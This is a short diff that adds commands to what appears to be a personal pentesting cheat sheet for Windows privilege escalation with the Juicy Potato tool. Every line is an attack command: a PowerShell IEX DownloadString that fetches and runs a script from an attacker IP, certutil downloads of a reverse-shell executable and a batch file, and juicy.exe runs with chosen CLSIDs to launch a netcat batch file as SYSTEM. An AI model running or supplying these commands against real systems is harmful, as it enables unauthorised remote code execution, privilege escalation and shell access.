@@ -9,6 +9,22 @@ certutil -urlcache -split -f http://192.168.119.149/reverseShell.exe exploit.exe
 
 cmd /c juicy.exe -l 1111 -p C:\Windows\Temp\test\nc.bat -t *
 
+#List of CLSID if it falls for choosen CLSID 
+http://ohpe.it/juicy-potato/CLSID/
+
+powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.101/GetCLSID.ps1')"
+
+
+certutil -urlcache -split -f http://10.10.16.101/test_clsid.bat
+
+cmd /c test_clsid.bat
+
+#list of valid clsid is in result.log (Choose the one in CAP letters preferably)
+#Test the clsid with single quote first
+cmd /c juicy.exe -l 1111 -p C:\Windows\Temp\test\nc.bat -t * -c '{B91D5831-B1BD-4608-8198-D72E155020F7}'
+
+cmd /c juicy.exe -l 1111 -p C:\Windows\Temp\test\nc.bat -t * -c {B91D5831-B1BD-4608-8198-D72E155020F7}
+
 cmd /c juicy.exe -l 1111 -p C:\Windows\Temp\test\exploit.exe -t *
 
 ## On linux
